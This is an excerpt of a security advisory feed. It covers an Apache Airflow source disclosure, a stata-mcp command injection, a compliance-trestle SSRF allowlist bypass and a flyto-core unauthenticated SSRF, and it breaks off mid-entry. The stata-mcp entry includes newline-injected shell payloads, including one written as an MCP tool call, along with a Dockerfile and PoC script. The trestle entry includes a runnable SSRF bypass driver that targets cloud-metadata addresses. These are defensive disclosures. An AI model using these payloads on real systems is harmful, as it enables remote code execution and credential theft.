        <content type="html"><![CDATA[<p>Before apache-airflow 3.3.0, a user authorized to read one Dag could disclose the source of other Dags co-located in the same source file. <code>GET /api/v2/dagSources/{dag_id}</code> — and the equivalent Dag-source view in the UI — returned the entire source file without redacting Dags the caller was not authorized to read, bypassing per-DAG read authorization. Deployments that co-locate multiple Dags in a single file and rely on per-DAG access control to limit source visibility are affected; single-Dag-per-file deployments are not. Upgrade to apache-airflow 3.3.0 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49296">https://nvd.nist.gov/vuln/detail/CVE-2026-49296</a></li>
<li><a href="https://github.com/apache/airflow/pull/67662">https://github.com/apache/airflow/pull/67662</a></li>
<li><a href="https://lists.apache.org/thread/qqv41t3oydkn9o14r2rfz1wkdrsp5jzn">https://lists.apache.org/thread/qqv41t3oydkn9o14r2rfz1wkdrsp5jzn</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/07/07/5">http://www.openwall.com/lists/oss-security/2026/07/07/5</a></li>
<li><a href="https://github.com/apache/airflow/commit/992e602015b5e9a3fd297e18047cff9d85094c95">https://github.com/apache/airflow/commit/992e602015b5e9a3fd297e18047cff9d85094c95</a></li>
<li><a href="https://github.com/apache/airflow/releases/tag/3.3.0">https://github.com/apache/airflow/releases/tag/3.3.0</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-2083.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-2083.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-4fh7-7jx4-8f6c">https://github.com/advisories/GHSA-4fh7-7jx4-8f6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4fh7-7jx4-8f6c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-07T12:31:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stata-mcp] MCP-for-Stata: Stata Command Injection via Unsanitized `package` in `ado_package_install`]]></title>
        <id>https://github.com/advisories/GHSA-49m4-vp58-wgc9</id>
        <link href="https://github.com/advisories/GHSA-49m4-vp58-wgc9"/>
        <updated>2026-08-12T19:23:39.000Z</updated>
        <content type="html"><![CDATA[<h2 id="stata-command-injection-via-unsanitized-package-in-ado_package_install">Stata Command Injection via Unsanitized <code>package</code> in <code>ado_package_install</code></h2>
<h3 id="summary">Summary</h3>
<p>The <code>ado_package_install</code> MCP tool in <code>stata-mcp</code> concatenates user-controlled input directly into a Stata command string without any validation or sanitization. An attacker who can invoke the MCP tool or the equivalent Python API can embed newline characters in the <code>package</code> argument to inject arbitrary Stata commands. Because Stata supports a <code>shell</code> escape command, this leads to full OS-level arbitrary command execution (RCE) under the account running the Stata-MCP server. The tool is registered in the default <code>all</code> profile, so no non-default configuration is required. Base CVSS score is <strong>8.4 (High)</strong>.</p>
<h3 id="details">Details</h3>
<p>The vulnerability originates in <code>SSC_Install.install()</code>:</p>
<pre><code class="language-python"># src/stata_mcp/stata/builtin_tools/ado_install/ssc_install.py:14-16
def install(self, package: str) -&gt; str:
    install_command = f"ssc install {package}{self.REPLACE_MESSAGE}"
    runner_result = self.controller.run(install_command)
</code></pre>
<p>The <code>package</code> parameter is interpolated into an f-string with no allowlist check, newline rejection, or quoting. The resulting command string is forwarded to the Stata interpreter verbatim:</p>
<pre><code class="language-python"># src/stata_mcp/stata/stata_controller/controller.py:98-99
# Send the command
self.child.sendline(command)
</code></pre>
<p><code>pexpect.sendline()</code> writes the full multi-line string to the Stata REPL, which executes each line as a separate Stata command. Because Stata's <code>shell</code> (and <code>!</code>) commands execute an OS shell command, a newline-delimited payload results in OS command execution.</p>
<p>The full source-to-sink data flow is:</p>
<ol>
<li><strong>Exposure</strong> — <code>src/stata_mcp/mcp_servers.py:626-632</code>: <code>_TOOL_REGISTRY</code> registers <code>ado_package_install</code> in the <code>all</code> profile.</li>
<li><strong>Default activation</strong> — <code>src/stata_mcp/cli/_handlers.py:295-300</code>: when no <code>--core</code>/<code>--all</code> flag is given the profile defaults to <code>all</code>, so the tool is always enabled.</li>
<li><strong>Propagation</strong> — <code>src/stata_mcp/mcp_servers.py:308-349</code>: the MCP argument <code>package</code> is passed to <code>installer(...).install(*args)</code> without validation.</li>
<li><strong>Sink construction</strong> — <code>src/stata_mcp/stata/builtin_tools/ado_install/ssc_install.py:15</code>: <code>package</code> is interpolated into <code>install_command</code>.</li>
<li><strong>Delivery</strong> — <code>src/stata_mcp/stata/stata_controller/controller.py:99</code>: <code>self.child.sendline(command)</code> sends the attacker-influenced string to Stata.</li>
</ol>
<p>A guard/blacklist (<code>src/stata_mcp/guard/blacklist.py:41-60</code>) registers <code>shell</code>, <code>!</code>, <code>winexec</code>, <code>unixcmd</code>, and similar strings as dangerous commands, but the <code>GuardValidator</code> that enforces this list is invoked <strong>only</strong> on the <code>stata_do</code> path and is not called anywhere in the ado-install path, making the guard entirely ineffective against this attack.</p>
<h3 id="poc">PoC</h3>
<p><strong>Prerequisites</strong></p>
<ul>
<li>Unix-like host with a configured Stata CLI, <strong>or</strong> use the provided Docker image which replaces the Stata binary with a minimal Python stub (<code>fake_stata.py</code>) that honours the <code>shell</code> command.</li>
</ul>
<p><strong>Container-based reproduction (no Stata license required)</strong></p>
<pre><code class="language-bash"># Build (run from the repository root)
docker build -t stata-mcp-poc-001 \
    -f vuln-001/Dockerfile \
    reports/pypiAi_828_SepineTam__stata-mcp/

# Run
docker run --rm stata-mcp-poc-001
</code></pre>
<p><strong>Direct Python trigger (unmodified source)</strong></p>
<pre><code class="language-python">import os
from stata_mcp.stata.builtin_tools.ado_install.ssc_install import SSC_Install

MARKER = "/tmp/stata_mcp_ado_poc"
PAYLOAD = f"outreg2\nshell touch {MARKER}\n//"

installer = SSC_Install("/usr/local/bin/stata", is_replace=True, timeout=10)
installer.install(PAYLOAD)

assert os.path.exists(MARKER), "RCE not confirmed"
print("RCE CONFIRMED — marker file created")
</code></pre>
<p>The payload <code>"outreg2\nshell touch /tmp/stata_mcp_ado_poc\n//"</code> is expanded by the f-string at <code>ssc_install.py:15</code> into:</p>
<pre><code>ssc install outreg2
shell touch /tmp/stata_mcp_ado_poc
//, replace
</code></pre>
<p>Stata executes the second line as an OS shell command. The trailing <code>//</code> comment neutralises the <code>, replace</code> suffix so Stata does not raise a syntax error.</p>
<p><strong>MCP JSON-RPC trigger</strong></p>
<pre><code class="language-json">{
  "tool": "ado_package_install",
  "arguments": {
    "source": "ssc",
    "package": "outreg2\nshell touch /tmp/stata_mcp_ado_poc\n//",
    "is_replace": true
  }
}
</code></pre>
<p><strong>Expected output</strong></p>
<pre><code>[+] PASS - RCE CONFIRMED
[+] Marker file exists: /tmp/stata_mcp_ado_poc
[+] The injected Stata 'shell' command was executed by the REPL.
</code></pre>
<p>Phase 2 dynamic reproduction confirmed the marker file <code>/tmp/stata_mcp_ado_poc</code> was created inside the Docker container, and <code>install()</code> returned a string containing the injected command:</p>
<pre><code>Installation State: False
ssc install outreg2\r\nshell touch /tmp/stata_mcp_ado_poc\r\n//, replace
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is a <strong>Code/Command Injection (RCE)</strong> vulnerability. Any principal who can call the <code>ado_package_install</code> MCP tool or the equivalent Python API — including an AI model or agent connected to the MCP server, a local script, or a remote HTTP client if the HTTP transport is exposed — can execute arbitrary OS commands with the privileges of the user running the Stata-MCP server.</p>
<p>Because the tool is registered in the default <code>all</code> profile and <code>all</code> is the default active profile, <strong>no misconfiguration by the victim is required</strong>. All users of <code>stata-mcp</code> on the affected version who run <code>stata-mcp server</code> are impacted.</p>
<p>Concrete consequences include: exfiltration of credentials and data accessible to the process, persistence via cron/startup entries, lateral movement within the local network, and complete compromise of the host user account.</p>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile"># Dockerfile for VULN-001 dynamic reproduction
# Build context must be the parent directory:
#   docker build -t stata-mcp-poc-001 -f vuln-001/Dockerfile .
#
# Vulnerability: Stata Command Injection via unsanitized `package` in
#   SSC_Install.install() (ssc_install.py:15).
#
# Strategy: replace the real Stata binary with a minimal Python script
#   (fake_stata.py) that honours the 'shell &lt;cmd&gt;' Stata command.
#   The vulnerable stata-mcp code is installed unmodified from the repo.

FROM python:3.11-slim

# Install pexpect -- the only runtime dependency required by the PoC
# (StataController imports pexpect; all other imports are stdlib-only).
RUN pip install --no-cache-dir pexpect==4.9.0

# ------------------------------------------------------------------
# Fake Stata binary
# ------------------------------------------------------------------
# Placed at /usr/local/bin/stata so StataFinder (Linux) can auto-discover
# it and the PoC can reference it by absolute path.
COPY vuln-001/fake_stata.py /usr/local/bin/stata
RUN chmod +x /usr/local/bin/stata

# ------------------------------------------------------------------
# Vulnerable package (unmodified source)
# ------------------------------------------------------------------
COPY repo/src /workspace/src
ENV PYTHONPATH=/workspace/src

# ------------------------------------------------------------------
# PoC script
# ------------------------------------------------------------------
COPY vuln-001/poc.py /workspace/poc.py

WORKDIR /workspace
CMD ["python3", "/workspace/poc.py"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">#!/usr/bin/env python3
"""
PoC for VULN-001: Stata Command Injection via unsanitized `package` in
`ado_package_install` (SSC path).

Vulnerable code:
    ssc_install.py:15
        install_command = f"ssc install {package}{self.REPLACE_MESSAGE}"
    controller.py:99
        self.child.sendline(command)

Attack: embed a newline in `package` to inject an additional Stata command.
    package = "outreg2\\nshell touch /tmp/stata_mcp_ado_poc\\n//"

The constructed command string becomes:
    ssc install outreg2
    shell touch /tmp/stata_mcp_ado_poc
    //, replace

pexpect delivers this multi-line string verbatim to the Stata REPL via
sendline(), causing Stata to execute 'shell touch /tmp/stata_mcp_ado_poc',
which runs the OS command 'touch /tmp/stata_mcp_ado_poc'.

Marker file creation confirms RCE.
"""
import os
import sys

FAKE_STATA = "/usr/local/bin/stata"
MARKER_FILE = "/tmp/stata_mcp_ado_poc"
# Payload: legit package name, then injected shell command, then comment to
# neutralise the ", replace" suffix appended by REPLACE_MESSAGE.
PAYLOAD = f"outreg2\nshell touch {MARKER_FILE}\n//"


def main() -&gt; int:
    print("=" * 60)
    print("VULN-001 PoC: Stata Command Injection via ado_package_install")
    print("=" * 60)
    print(f"[*] Fake Stata binary : {FAKE_STATA}")
    print(f"[*] Marker file       : {MARKER_FILE}")
    print(f"[*] Payload (repr)    : {PAYLOAD!r}")
    print()

    # Clean up any previous run.
    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)
        print(f"[*] Removed pre-existing marker file.")

    # Import the vulnerable class directly -- no MCP or config layer needed.
    # The vulnerability lives entirely in SSC_Install.install() and the
    # StataController that sends the command to the Stata REPL.
    from stata_mcp.stata.builtin_tools.ado_install.ssc_install import SSC_Install

    print("[*] Instantiating SSC_Install with fake Stata binary...")
    installer = SSC_Install(FAKE_STATA, is_replace=True, timeout=10)

    print(f"[*] Calling install({PAYLOAD!r}) ...")
    try:
        result = installer.install(PAYLOAD)
        print(f"[*] install() returned: {result[:200]!r}")
    except Exception as exc:
        # A RuntimeError from StataController is acceptable; the shell command
        # may have already executed before the error is detected.
        print(f"[!] install() raised (may be expected): {type(exc).__name__}: {exc}")

    print()

    # --- Verdict ---
    if os.path.exists(MARKER_FILE):
        print("[+] PASS - RCE CONFIRMED")
        print(f"[+] Marker file exists: {MARKER_FILE}")
        print("[+] The injected Stata 'shell' command was executed by the REPL.")
        print("[+] Constructed command delivered via sendline():")
        print("[+]   ssc install outreg2")
        print(f"[+]   shell touch {MARKER_FILE}  &lt;-- OS command executed here")
        print("[+]   //")
        return 0
    else:
        print("[-] FAIL - Marker file not found.")
        print("[-] The injected shell command did not produce the expected artefact.")
        return 1


if __name__ == "__main__":
    sys.exit(main())
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/SepineTam/mcp-for-stata/security/advisories/GHSA-49m4-vp58-wgc9">https://github.com/SepineTam/mcp-for-stata/security/advisories/GHSA-49m4-vp58-wgc9</a></li>
<li><a href="https://github.com/SepineTam/mcp-for-stata/releases/tag/v1.19.0">https://github.com/SepineTam/mcp-for-stata/releases/tag/v1.19.0</a></li>
<li><a href="https://github.com/advisories/GHSA-49m4-vp58-wgc9">https://github.com/advisories/GHSA-49m4-vp58-wgc9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-49m4-vp58-wgc9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-12T19:23:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[compliance-trestle] compliance-trestle has an URLSecurityValidator SSRF allowlist bypass via IPv4-mapped IPv6 and 0.0.0.0]]></title>
        <id>https://github.com/advisories/GHSA-h47f-gmjp-m7rr</id>
        <link href="https://github.com/advisories/GHSA-h47f-gmjp-m7rr"/>
        <updated>2026-08-12T15:21:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>compliance-trestle</code> 4.0.3 (latest) ships an <code>URLSecurityValidator</code> in <code>trestle/core/remote/security.py</code> to block SSRF to loopback / link-local / cloud-metadata endpoints from the HTTPSFetcher and SFTPFetcher remote-fetch paths. The allowlist is incomplete and can be bypassed by four equivalent address representations that resolve to the same blocked host but evade the validator's checks:</p>
<ul>
<li>IPv4-mapped IPv6 literals (<code>[::ffff:169.254.169.254]</code>, <code>[::ffff:127.0.0.1]</code>, <code>[::ffff:10.0.0.1]</code>) are returned by <code>socket.getaddrinfo</code> as <code>IPv6Address</code> objects; <code>IPv6Address in IPv4Network('169.254.0.0/16')</code> returns <code>False</code>, so the <code>_check_blocked_networks</code> and <code>_check_private_networks</code> predicates do not match.</li>
<li>IPv4 unspecified address <code>0.0.0.0</code> is not in <code>ALWAYS_BLOCKED_NETWORKS</code> (which covers <code>127.0.0.0/8</code> but not <code>0.0.0.0/8</code>); on Linux + Docker, <code>0.0.0.0</code> routes to local services on any interface, and on dual-stack-mapped sockets it also reaches loopback listeners.</li>
</ul>
<p>A malicious OSCAL profile referencing one of these URLs in <code>imports[*].href</code> or <code>back-matter.resources[*].rlinks[*].href</code> causes <code>HTTPSFetcher.__init__</code> and <code>_do_fetch</code> (which both invoke <code>validator.validate_url</code>) to pass the URL through to <code>requests.get</code>, contacting cloud-metadata services, loopback admin interfaces, or RFC 1918 internal networks (with <code>TRESTLE_BLOCK_PRIVATE_IPS=true</code> set) that the validator was specifically designed to block.</p>
<h3 id="affected-versions">Affected versions</h3>
<p><code>compliance-trestle</code> (PyPI) versions <code>&lt;= 4.0.3</code> are affected. 4.0.3 (released 2026-05-20) is the latest release and the one that introduced <code>URLSecurityValidator</code>; prior releases had no SSRF guard at all.</p>
<h3 id="privilege-required">Privilege required</h3>
<p>Network-position attacker who can supply or influence an OSCAL artifact (profile / catalog / SSP / component-definition) that compliance-trestle subsequently fetches via <code>HTTPSFetcher</code> or <code>SFTPFetcher</code>. The most realistic vector is a malicious OSCAL profile whose <code>imports[*].href</code> references one of the bypass URLs; the artifact then flows through <code>trestle href add</code> / <code>trestle import</code> / <code>trestle assemble</code> / <code>trestle author</code> / any workflow that resolves the profile's imports.</p>
<h3 id="root-cause">Root cause</h3>
<p><code>trestle/core/remote/security.py</code> (4.0.3, lines 56-71 + 156-167):</p>
<pre><code class="language-python">ALWAYS_BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),     # IPv4 loopback only
    ipaddress.ip_network('::1/128'),         # IPv6 loopback (single address)
    ipaddress.ip_network('169.254.0.0/16'),  # IPv4 link-local only
    ipaddress.ip_network('fe80::/10'),       # IPv6 link-local
]

METADATA_HOSTNAMES = {
    '169.254.169.254',          # IPv4 literal only
    'metadata.google.internal',
    'metadata.azure.com',
    '100.100.100.200',
}

def _check_blocked_networks(self, ip_addr, hostname):
    for network in ALWAYS_BLOCKED_NETWORKS:
        if ip_addr in network:  # IPv6Address in IPv4Network -&gt; False
            raise TrestleError(...)
</code></pre>
<p>Four independent gaps:</p>
<ol>
<li><p><strong>No IPv4-mapped IPv6 normalization.</strong> <code>socket.getaddrinfo('::ffff:169.254.169.254', None)</code> returns an <code>IPv6Address</code>. Python's <code>ipaddress</code> module raises <code>TypeError</code> if mixed types are compared, and the <code>in</code> operator suppresses that to <code>False</code>. The validator never calls <code>.ipv4_mapped</code> to canonicalize before the membership check, so any always-blocked IPv4 range is bypassable via the <code>[::ffff:N.N.N.N]</code> literal.</p>
</li>
<li><p><strong><code>METADATA_HOSTNAMES</code> is an exact-string set.</strong> The hostname for <code>https://[::ffff:169.254.169.254]/</code> is <code>::ffff:169.254.169.254</code>, which is not in the set.</p>
</li>
<li><p><strong><code>0.0.0.0</code> is not blocked.</strong> <code>0.0.0.0</code> is not in any of the four <code>ALWAYS_BLOCKED_NETWORKS</code> ranges. On Linux and inside containers, connecting to <code>0.0.0.0</code> routes to local services on any interface (a common SSRF technique against Docker / orchestrator agents on <code>0.0.0.0:PORT</code>).</p>
</li>
<li><p><strong>DNS rebinding ribbon is only one IP deep.</strong> <code>_resolve_hostname</code> records the first <code>getaddrinfo</code> result set, but a hostname with mixed records can still serve a private IP on the second resolution <code>validator.validate_url(self._url)</code> performs in <code>_do_fetch</code>. The IPv4-mapped-IPv6 bypass already eliminates the need for rebinding.</p>
</li>
</ol>
<p>Sibling code paths sharing the same defect: <code>SFTPFetcher.__init__</code> (lines 359-365 of <code>cache.py</code>) wires the identical <code>URLSecurityValidator</code> and inherits all four gaps.</p>
<h3 id="reproduction-e2e-against-pip-install-compliance-trestle403--local-imds-simulator">Reproduction (E2E against <code>pip install compliance-trestle==4.0.3</code> + local IMDS simulator)</h3>
<pre><code class="language-bash"># 1. Setup
mkdir -p /tmp/poc-trestle &amp;&amp; cd /tmp/poc-trestle
python3.12 -m venv venv   # any supported runtime (requires-python &gt;= 3.10); 3.12.13 chosen because &gt;= 3.12.4 it carries CPython CVE-2024-4032's is_global fix, proving this bypass is is_global-INDEPENDENT
./venv/bin/pip install --quiet compliance-trestle==4.0.3
./venv/bin/pip show compliance-trestle | head -2
# Name: compliance-trestle
# Version: 4.0.3

# 2. Driver
cat &gt; e2e_full.py &lt;&lt;'PY'
import http.server, http.client, socket, socketserver, threading, time, os
from urllib.parse import urlparse
from trestle.core.remote.security import URLSecurityValidator, get_block_private_ips_config
from trestle.common.err import TrestleError

class IMDS(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = b'{"Code":"Success","AccessKeyId":"AKIA_PWNED_VIA_TRESTLE_SSRF","SecretAccessKey":"REDACTED","Token":"FAKE_IMDS_RESPONSE"}'
        self.send_response(200); self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body)
    def log_message(self, *a, **kw): pass

class DualStack(socketserver.ThreadingMixIn, http.server.HTTPServer):
    address_family = socket.AF_INET6
    def server_bind(self):
        try: self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        except (AttributeError, OSError): pass
        super().server_bind()

PORT = 18560
srv = DualStack(("::", PORT), IMDS)
threading.Thread(target=srv.serve_forever, daemon=True).start()
time.sleep(0.2)

validator = URLSecurityValidator(block_private_ips=True)
def attempt(label, url, expect_block):
    try:
        validator.validate_url(url); verdict, blocked = "VALIDATION PASSED", False
    except TrestleError as e:
        verdict, blocked = f"BLOCKED: {str(e)[:80]}", True
    meta = "(expected)" if blocked == expect_block else "(*** UNEXPECTED ***)"
    print(f"\n[{label}]\n  URL: {url}\n  Validator: {verdict}  {meta}")
    if not blocked:
        try:
            p = urlparse(url); c = http.client.HTTPConnection(p.hostname, p.port or 443, timeout=3)
            c.request("GET", p.path or "/"); r = c.getresponse(); print(f"  Connectivity: HTTP {r.status}, body[:60]={r.read()[:60]!r}"); c.close()
        except Exception as e:
            print(f"  Connectivity: {type(e).__name__}: {str(e)[:80]}")

# Negative controls (validator must block)
attempt("NEG-1: literal 169.254.169.254", f"https://169.254.169.254:{PORT}/latest/meta-data/", True)
attempt("NEG-2: literal 127.0.0.1", f"https://127.0.0.1:{PORT}/admin", True)
attempt("NEG-3: metadata.google.internal", f"https://metadata.google.internal:{PORT}/", True)
attempt("NEG-4: literal 10.0.0.1 RFC1918", f"https://10.0.0.1:{PORT}/admin", True)
# Bypasses (validator should block, but does not)
attempt("BYPASS-1: IPv4-mapped IPv6 cloud-metadata", f"https://[::ffff:169.254.169.254]:{PORT}/latest/meta-data/iam/security-credentials/admin", True)
attempt("BYPASS-2: 0.0.0.0 reaches localhost", f"https://0.0.0.0:{PORT}/admin", True)
attempt("BYPASS-3: IPv4-mapped IPv6 loopback", f"https://[::ffff:127.0.0.1]:{PORT}/admin", True)
attempt("BYPASS-4: IPv4-mapped IPv6 RFC 1918", f"https://[::ffff:10.0.0.1]:{PORT}/admin", True)
srv.shutdown()
PY

# 3. Run
./venv/bin/python e2e_full.py
</code></pre>
<p>Observed output on a supported runtime, Python 3.12.13 / macOS Darwin 25.3.0 (verbatim). Note 3.12.13 is &gt;= 3.12.4, so CPython CVE-2024-4032's <code>is_global</code>/<code>is_private</code> reclassification IS active here; the bypass nevertheless works because this validator uses <code>IPv6Address in IPv4Network(...)</code> membership (which silently returns False for cross-version comparison), NOT the <code>is_global</code> predicate. The mechanism is therefore robust to CPython version:</p>
<pre><code>Python: 3.12.13
compliance-trestle: 4.0.3
  ::ffff:169.254.169.254       is_global=False  is_private=True  in IPv4Network('169.254.0.0/16')=False
  ::ffff:127.0.0.1             is_global=False  is_private=True  in IPv4Network('169.254.0.0/16')=False
  ::ffff:10.0.0.1              is_global=False  is_private=True  in IPv4Network('169.254.0.0/16')=False

[NEG-1: literal 169.254.169.254]
  URL: https://169.254.169.254:18560/latest/meta-data/
  Validator: BLOCKED: Access to cloud metadata endpoints is not allowed: 169.254.169.254. This is a se  (expected)

[NEG-2: literal 127.0.0.1]
  URL: https://127.0.0.1:18560/admin
  Validator: BLOCKED: Access to 127.0.0.0/8 addresses is blocked: 127.0.0.1 resolves to 127.0.0.1. Thi  (expected)

[NEG-3: metadata.google.internal]
  URL: https://metadata.google.internal:18560/
  Validator: BLOCKED: Access to cloud metadata endpoints is not allowed: metadata.google.internal. Thi  (expected)

[NEG-4: literal 10.0.0.1 RFC1918]
  URL: https://10.0.0.1:18560/admin
  Validator: BLOCKED: Access to private IP addresses is blocked: 10.0.0.1 resolves to 10.0.0.1 which i  (expected)

[BYPASS-1: IPv4-mapped IPv6 cloud-metadata]
  URL: https://[::ffff:169.254.169.254]:18560/latest/meta-data/iam/security-credentials/admin
  Validator: VALIDATION PASSED  (*** UNEXPECTED ***)
  Connectivity: TimeoutError: timed out

[BYPASS-2: 0.0.0.0 reaches localhost]
  URL: https://0.0.0.0:18560/admin
  Validator: VALIDATION PASSED  (*** UNEXPECTED ***)
  Connectivity: HTTP 200, body[:60]=b'{"Code":"Success","AccessKeyId":"AKIA_PWNED_VIA_TRESTLE_SSRF'

[BYPASS-3: IPv4-mapped IPv6 loopback]
  URL: https://[::ffff:127.0.0.1]:18560/admin
  Validator: VALIDATION PASSED  (*** UNEXPECTED ***)
  Connectivity: HTTP 200, body[:60]=b'{"Code":"Success","AccessKeyId":"AKIA_PWNED_VIA_TRESTLE_SSRF'

[BYPASS-4: IPv4-mapped IPv6 RFC 1918]
  URL: https://[::ffff:10.0.0.1]:18560/admin
  Validator: VALIDATION PASSED  (*** UNEXPECTED ***)
  Connectivity: RemoteDisconnected: Remote end closed connection without response
</code></pre>
<p>(The bracketed-IPv6 diagnostic lines above are the load-bearing proof of <code>is_global</code>-independence: even with CPython's CVE-2024-4032 fix active (<code>is_global=False</code>, <code>is_private=True</code>), the validator's <code>in IPv4Network(...)</code> membership check still returns <code>False</code>, so the bypass is not contingent on running an older Python. BYPASS-1/BYPASS-4 show the guard passing the URL; their connectivity lines time out only because the local sentinel listens on loopback/<code>::</code>, not on those literal addresses -- the security-relevant result is the validator passing, which on a real dual-stack host routes to the embedded IPv4 endpoint.)</p>
<p>Negative controls confirm the validator works as designed for the canonical literal forms it was written to block. All four bypass URLs pass <code>URLSecurityValidator.validate_url()</code> on the latest patched release.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>SSRF to AWS / Azure / GCP / Alibaba IMDS via <code>https://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/&lt;role&gt;</code> -&gt; short-lived role credentials exfiltrated through the cached fetch.</li>
<li>SSRF to loopback administrative interfaces via <code>https://0.0.0.0:PORT/</code> or <code>https://[::ffff:127.0.0.1]:PORT/</code> -&gt; access to local-only admin endpoints (Docker socket on <code>unix://</code>, Prometheus, etcd, Kubelet) that the validator was supposed to deny.</li>
<li>SSRF to RFC 1918 internal services via <code>https://[::ffff:10.0.0.1]/...</code> even when <code>TRESTLE_BLOCK_PRIVATE_IPS=true</code> is explicitly set, defeating the operator's defense-in-depth posture.</li>
<li>The cache-write traversal protection (<code>PathSecurityValidator.validate_url_path_for_cache</code> + <code>validate_cache_path</code>) is orthogonal and remains effective; this advisory is scoped to the SSRF allowlist gap only.</li>
</ul>
<h3 id="suggested-fix">Suggested fix</h3>
<p>Normalize every resolved IP to its canonical IPv4 form before membership checks, and add <code>0.0.0.0</code> to the always-blocked set. Diff sketch against <code>trestle/core/remote/security.py</code>:</p>
<pre><code class="language-python">ALWAYS_BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('::1/128'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('fe80::/10'),
    ipaddress.ip_network('0.0.0.0/8'),     # IPv4 "this network", reaches localhost on Linux
    ipaddress.ip_network('::/128'),        # IPv6 unspecified
]

def _canonicalize_ip(self, ip_addr):
    """Map IPv4-mapped IPv6 addresses (::ffff:a.b.c.d) to their IPv4 form."""
    if isinstance(ip_addr, ipaddress.IPv6Address) and ip_addr.ipv4_mapped is not None:
        return ip_addr.ipv4_mapped
    return ip_addr

def _check_blocked_networks(self, ip_addr, hostname):
    ip_addr = self._canonicalize_ip(ip_addr)
    for network in ALWAYS_BLOCKED_NETWORKS:
        if ip_addr.version == network.version and ip_addr in network:
            raise TrestleError(...)

def _check_private_networks(self, ip_addr, hostname):
    ip_addr = self._canonicalize_ip(ip_addr)
    # ... same canonicalization before block_private_ip / warn_private_ip
</code></pre>
<p>Also add the canonicalized literal to <code>_check_metadata_endpoints</code>:</p>
<pre><code class="language-python">def _check_metadata_endpoints(self, hostname):
    # Canonicalize bracketed IPv6 literal hostnames before exact-match
    canonical = hostname.strip('[]')
    try:
        canonical_ip = ipaddress.ip_address(canonical)
        if isinstance(canonical_ip, ipaddress.IPv6Address) and canonical_ip.ipv4_mapped:
            canonical = str(canonical_ip.ipv4_mapped)
    except ValueError:
        pass
    if canonical in METADATA_HOSTNAMES:
        raise TrestleError(...)
</code></pre>
<p>This mirrors the canonicalization pattern that pyca/cryptography, rustls-webpki, and the recent Node <code>undici</code> SSRF patches converged on after similar IPv6-mapped bypasses surfaced in 2024-2025.</p>
<h3 id="credit">Credit</h3>
<p>Reported by tonghuaroot.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-h47f-gmjp-m7rr">https://github.com/oscal-compass/compliance-trestle/security/advisories/GHSA-h47f-gmjp-m7rr</a></li>
<li><a href="https://github.com/oscal-compass/compliance-trestle/commit/d107cd16efe8eb15d46be3c1d97f1ec73d32447c">https://github.com/oscal-compass/compliance-trestle/commit/d107cd16efe8eb15d46be3c1d97f1ec73d32447c</a></li>
<li><a href="https://github.com/advisories/GHSA-h47f-gmjp-m7rr">https://github.com/advisories/GHSA-h47f-gmjp-m7rr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h47f-gmjp-m7rr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-12T15:21:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flyto-core] Flyto2 Core: Unauthenticated flyto-verification /run: callback_url SSRF and internal runner-secret exfiltration]]></title>
        <id>https://github.com/advisories/GHSA-jx74-cqjv-2c67</id>
        <link href="https://github.com/advisories/GHSA-jx74-cqjv-2c67"/>
        <updated>2026-08-10T15:00:02.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The standalone <code>flyto-verification</code> service exposes <code>POST /run</code> with <strong>no authentication</strong>, on all interfaces (0.0.0.0:8344 per the shipped Dockerfile). The request body's <code>callback_url</code> is used verbatim for an outbound POST that <strong>unconditionally attaches <code>X-Internal-Key: $FLYTO_RUNNER_SECRET</code></strong>. The <code>callback_url</code> bypasses the service's <code>target_allowed</code> allowlist (which only inspects <code>params.target_url</code>) and is never passed through any SSRF guard. This yields (a) unauthenticated SSRF to internal/metadata endpoints with an attacker-controlled JSON body, and (b) exfiltration of the internal runner secret to an attacker-controlled host — allowing forged authenticated callbacks to the real engine.</p>
<h2 id="root-cause">Root Cause</h2>
<ul>
<li><code>src/core/verification_service.py:363-364</code> — <code>/run</code> has no <code>Depends</code>/auth dependency.</li>
<li><code>resolve_callback_url</code> returns the client <code>callback_url</code> verbatim (<code>:315-316</code>).</li>
<li><code>post_callback</code> attaches <code>X-Internal-Key: $FLYTO_RUNNER_SECRET</code> whenever the env var is set (<code>:327-335</code>).</li>
